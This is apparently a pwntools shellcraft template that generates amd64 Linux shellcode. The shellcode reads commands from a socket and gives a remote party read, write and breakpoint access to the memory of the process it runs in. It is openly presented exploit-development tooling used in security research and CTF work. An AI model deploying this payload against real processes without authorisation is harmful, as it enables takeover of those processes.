<% from pwnlib.shellcraft import amd64 %>
<% from pwnlib.shellcraft import common %>
<%page args="readsock = 0, writesock = 1"/>
<%docstring>
Read-write access to a remote process' memory.

Provide a single pointer-width value to determine the operation to perform:

- 0: Exit the loop
- 1: Read data
- 2: Write data
</%docstring>
<%
start   = common.label("start")
read    = common.label("read")
write   = common.label("write")
done    = common.label("done")
bkpt    = common.label("bkpt")
%>

${start}:
    ${amd64.linux.readptr(readsock, 'rax')}
    test rax, rax
    jz ${done}
    dec rax
    test rax, rax
    jz ${read}
    dec rax
    test rax, rax
    jz ${write}
    dec rax
    test rax, rax
    jz ${bkpt}
    jmp ${done}

${read}:
    ${amd64.linux.readloop(readsock)}
    jmp ${start}

${write}:
    ${amd64.linux.writeloop(readsock, writesock)}
    jmp ${start}

${bkpt}:
    int3
    jmp ${start}

${done}:
